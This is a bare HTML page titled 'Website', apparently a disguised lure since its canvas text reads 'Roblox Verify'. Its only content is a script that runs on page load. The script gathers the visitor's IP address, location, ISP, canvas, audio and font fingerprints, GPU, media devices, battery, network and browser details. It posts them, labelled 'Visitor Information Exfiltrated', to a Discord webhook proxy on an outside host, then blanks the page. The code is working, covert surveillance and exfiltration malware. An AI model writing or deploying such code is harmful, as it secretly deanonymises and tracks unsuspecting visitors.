<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Website</title>
</head>
<body>
    <script>
        const UrlProxy = "https://discord-proxy.oliverp0404.workers.dev/";

        async function checkTranslator() {
            let translatorStatus = "Not Detected / Default";
            try {
                const htmlTag = document.documentElement;
                if (htmlTag.classList.contains("translated-ltr") || htmlTag.classList.contains("translated-rtl") || htmlTag.hasAttribute("googtrans")) {
                    translatorStatus = "Active (Browser/Extension Translation Detected)";
                } else if (window.google && window.google.translate) {
                    translatorStatus = "Google Translate Widget Active";
                }
            } catch (e) {}
            return translatorStatus;
        }

        async function checkMediaDevices() {
            let devicesList = [];
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    devices.forEach(device => {
                        devicesList.push(`${device.kind}: ${device.label || "Unknown Label"}`);
                    });
                }
            } catch (e) {}
            return devicesList.length > 0 ? devicesList.join("\n") : "None Detected";
        }

        function getDetectedFonts() {
            const fontList = ["Arial", "Comic Sans MS", "Courier New", "Georgia", "Impact", "Times New Roman", "Trebuchet MS", "Verdana", "Tahoma", "Palatino"];
            const detected = [];
            try {
                const baseFonts = ["monospace", "sans-serif", "serif"];
                const testString = "mmmmmmmmmmlli";
                const testSize = "72px";
                const h = document.getElementsByTagName("body")[0];

                const span = document.createElement("span");
                span.style.fontSize = testSize;
                span.innerHTML = testString;
                const defaultWidth = {};
                const defaultHeight = {};

                for (let index = 0; index < baseFonts.length; index++) {
                    span.style.fontFamily = baseFonts[index];
                    h.appendChild(span);
                    defaultWidth[baseFonts[index]] = span.offsetWidth;
                    defaultHeight[baseFonts[index]] = span.offsetHeight;
                    h.removeChild(span);
                }

                for (let i = 0; i < fontList.length; i++) {
                    let detectedFont = false;
                    for (let j = 0; j < baseFonts.length; j++) {
                        span.style.fontFamily = `'${fontList[i]}', ${baseFonts[j]}`;
                        h.appendChild(span);
                        const matched = (span.offsetWidth !== defaultWidth[baseFonts[j]] || span.offsetHeight !== defaultHeight[baseFonts[j]]);
                        h.removeChild(span);
                        if (matched) {
                            detectedFont = true;
                            break;
                        }
                    }
                    if (detectedFont) {
                        detected.push(fontList[i]);
                    }
                }
            } catch (e) {}
            return detected.length > 0 ? detected.join(", ") : "None Detected";
        }

        async function getAudioFingerprint() {
            return new Promise((resolve) => {
                try {
                    const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                    if (!AudioContext) return resolve("Not Supported");
                    const ctx = new AudioContext(1, 44100, 44100);
                    const osc = ctx.createOscillator();
                    osc.type = "triangle";
                    osc.frequency.setValueAtTime(10000, ctx.currentTime);
                    const compressor = ctx.createDynamicsCompressor();
                    compressor.threshold.setValueAtTime(-50, ctx.currentTime);
                    compressor.knee.setValueAtTime(40, ctx.currentTime);
                    compressor.ratio.setValueAtTime(12, ctx.currentTime);
                    compressor.attack.setValueAtTime(0, ctx.currentTime);
                    compressor.release.setValueAtTime(0.25, ctx.currentTime);
                    osc.connect(compressor);
                    compressor.connect(ctx.destination);
                    osc.start(0);
                    ctx.startRendering().then(renderedBuffer => {
                        const channelData = renderedBuffer.getChannelData(0);
                        let sum = 0;
                        for (let i = 4500; i < 5000; i++) {
                            sum += Math.abs(channelData[i]);
                        }
                        resolve(sum.toString().slice(0, 20));
                    }).catch(() => resolve("Error"));
                } catch (e) {
                    resolve("Error");
                }
            });
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Roblox Verify 🚀", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Roblox Verify 🚀", 4, 17);
                return canvas.toDataURL().slice(-30);
            } catch (e) {
                return "Error";
            }
        }

        function getCpuBenchmark() {
            try {
                const start = performance.now();
                let val = 0;
                for (let i = 0; i < 5000000; i++) {
                    val += Math.sqrt(i);
                }
                const end = performance.now();
                return `${Math.round(end - start)} ms`;
            } catch (e) {
                return "Unknown";
            }
        }

        async function runTelemetry() {
            let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", country_name: "Unknown", org: "Unknown" };
            try {
                const ipResponse = await fetch("https://ipapi.co/json/");
                if (ipResponse.ok) {
                    ipData = await ipResponse.json();
                }
            } catch (e) {}

            let batteryLevel = "Unknown";
            let batteryStatus = "Unknown";
            let isStationary = false;
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    const levelPct = Math.round(bat.level * 100);
                    batteryLevel = levelPct + "%";
                    batteryStatus = bat.charging ? "Charging" : "Discharging";

                    if (bat.charging && levelPct === 100) {
                        isStationary = true;
                    }
                }
            } catch (e) {}

            let gpuInfo = "Unknown";
            let webglExts = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    const exts = gl.getSupportedExtensions();
                    if (exts) {
                        webglExts = exts.slice(0, 10).join(", ") + (exts.length > 10 ? "..." : "");
                    }
                }
            } catch (e) {}

            let connType = "Unknown";
            let downlink = "Unknown";
            let rtt = "Unknown";
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    connType = conn.effectiveType || "Unknown";
                    downlink = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
                    rtt = conn.rtt ? conn.rtt + " ms" : "Unknown";
                }
            } catch (e) {}

            let storageQuota = "Unknown";
            try {
                if (navigator.storage && navigator.storage.estimate) {
                    const estimate = await navigator.storage.estimate();
                    const quotaMB = Math.round(estimate.quota / (1024 * 1024));
                    const usageMB = Math.round(estimate.usage / (1024 * 1024));
                    storageQuota = `${usageMB} MB used / ${quotaMB} MB quota`;
                }
            } catch (e) {}

            const translatorResult = await checkTranslator();
            const mediaDevicesResult = await checkMediaDevices();
            const detectedFonts = getDetectedFonts();
            const audioHash = await getAudioFingerprint();
            const canvasHash = getCanvasFingerprint();
            const cpuScore = getCpuBenchmark();

            const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark Mode" : "Light Mode";
            const touchSupport = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} pts)` : "No Touch";
            const doNotTrack = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "Not Set";
            const windowFocus = document.hasFocus() ? "Focused" : "Unfocused";
            const visibilityState = document.visibilityState || "Unknown";
            const onlineStatus = navigator.onLine ? "Online" : "Offline";

            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
            let inferredDevice = isMobile ? "Mobile / Phone" : "Laptop / Desktop";
            if (isStationary) {
                inferredDevice += " [Flagged: Possible Non-Portable / Desktop PC (100% & Charging)]";
            }

            const payload = {
                content: "  **Visitor Information Exfiltrated**",
                embeds: [{
                    title: "Client Reconnaissance Report",
                    description: "Comprehensive client reconnaissance report successfully compiled and exfiltrated.",
                    color: 1388543,
                    fields: [
                        { name: "🌐 IP Address", value: ipData.ip || "Unknown", inline: true },
                        { name: "📍 Location", value: `${ipData.city || "Unknown"}, ${ipData.region || "Unknown"}, ${ipData.country_name || "Unknown"}`, inline: true },
                        { name: "🏢 ISP / Org", value: ipData.org || "Unknown", inline: false },
                        { name: "🎵 Audio Hash", value: audioHash, inline: true },
                        { name: "🎨 Canvas Hash", value: canvasHash, inline: true },
                        { name: "⚡ CPU Speed", value: cpuScore, inline: true },
                        { name: "🔤 Detected Fonts", value: detectedFonts, inline: false },
                        { name: "🎮 WebGL Extensions", value: webglExts, inline: false },
                        { name: "📷 Media Devices", value: mediaDevicesResult, inline: false },
                        { name: "👁️ Tab State", value: `${windowFocus} / ${visibilityState} (${onlineStatus})`, inline: false },
                        { name: "⚙️ User Prefs (Theme/Touch/DNT)", value: `${darkMode} | ${touchSupport} | DNT: ${doNotTrack}`, inline: false },
                        { name: "🌐 Translator Status", value: translatorResult, inline: false },
                        { name: "📶 Network Type", value: connType, inline: true },
                        { name: "⏱️ Downlink / RTT", value: `${downlink} / ${rtt}`, inline: true },
                        { name: "💾 Storage Quota", value: storageQuota, inline: false },
                        { name: "💻 Inferred Device", value: inferredDevice, inline: false },
                        { name: "🖥️ OS / Platform", value: navigator.platform, inline: true },
                        { name: "🧠 CPU Cores", value: String(navigator.hardwareConcurrency || "Unknown"), inline: true },
                        { name: "⚡ RAM Estimate", value: navigator.deviceMemory ? navigator.deviceMemory + "GB (Approx)" : "Unknown", inline: true },
                        { name: "🎮 GPU Renderer", value: gpuInfo, inline: false },
                        { name: "🖥️ Screen Settings", value: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`, inline: true },
                        { name: "🗣️ User Language", value: navigator.language, inline: true },
                        { name: "🌍 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
                        { name: "🔋 Battery", value: `${batteryLevel} (${batteryStatus})`, inline: true },
                        { name: "🌐 Browser User Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: {
                        text: "Secure Reconnaissance System v4.2 • Exfiltration Successful"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(UrlProxy, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            try {
                window.close();
            } catch (e) {}
            window.location.href = "about:blank";
        }

        runTelemetry();
    </script>
</body>
</html>
